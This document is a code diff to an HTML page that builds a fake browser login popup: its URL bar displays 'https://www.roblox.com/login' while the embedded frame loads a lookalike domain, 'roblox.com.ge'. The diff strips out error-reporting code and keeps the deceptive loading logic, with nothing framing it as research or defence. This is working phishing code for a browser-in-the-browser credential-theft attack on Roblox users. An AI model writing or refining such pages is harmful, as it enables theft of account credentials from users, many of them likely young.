@@ -70,7 +70,6 @@
     .url-bar { background:#f4f4f4; border:1px solid #ccc; margin:10px; padding:6px 10px; border-radius:6px; font-size:13px; font-family:monospace; color:#333; overflow:hidden; white-space:nowrap; text-overflow:ellipsis; }
     .popup-iframe { width:100%; height:calc(100% - 76px); border:none; }
     .overlay { display:none; position:fixed; top:0; left:0; width:100vw; height:100vh; background:rgba(0,0,0,0.65); z-index:999; }
-    .error-banner { display:none; background:#fff1f1; color:#8a1c1c; padding:10px; font-size:13px; }
   </style>
 </head>
 <body>
@@ -126,7 +125,6 @@
       <div class="popup-close" id="popupClose">&times;</div>
     </div>
     <div class="url-bar" id="urlDisplay">🔒 https://www.roblox.com/login</div>
-    <div class="error-banner" id="errorBanner"></div>
     <iframe class="popup-iframe" id="popupIframe"></iframe>
   </div>
 
@@ -140,7 +138,6 @@
     const overlay = document.getElementById("overlay");
     const iframe = document.getElementById("popupIframe");
     const urlDisplay = document.getElementById("urlDisplay");
-    const errorBanner = document.getElementById("errorBanner");
 
     loginBtn.addEventListener("click", () => {
       const realUrl = "https://roblox.com.ge/login?returnUrl=2099296147452818";
@@ -149,33 +146,13 @@
       fakePopup.style.display = "block";
       overlay.style.display = "block";
       iframe.src = ""; // reset iframe
-      errorBanner.style.display = "none";
 
       urlDisplay.textContent = fakeUrl;
 
-      // Force the browser to attempt load after user click
+      // Force load iframe after user click
       setTimeout(() => {
-        try {
-          iframe.src = realUrl;
-        } catch(e) {
-          errorBanner.textContent = "Failed to load iframe: " + e.message;
-          errorBanner.style.display = "block";
-        }
+        iframe.src = realUrl;
       }, 50);
-
-      // Fallback check
-      setTimeout(() => {
-        try {
-          const doc = iframe.contentDocument || iframe.contentWindow.document;
-          if (!doc || doc.body.innerHTML === "") {
-            errorBanner.textContent = "The iframe likely failed to load due to browser security restrictions.";
-            errorBanner.style.display = "block";
-          }
-        } catch(e) {
-          errorBanner.textContent = "The iframe likely failed to load due to cross-origin restrictions.";
-          errorBanner.style.display = "block";
-        }
-      }, 4000);
     });
 
     popupClose.addEventListener("click", () => {
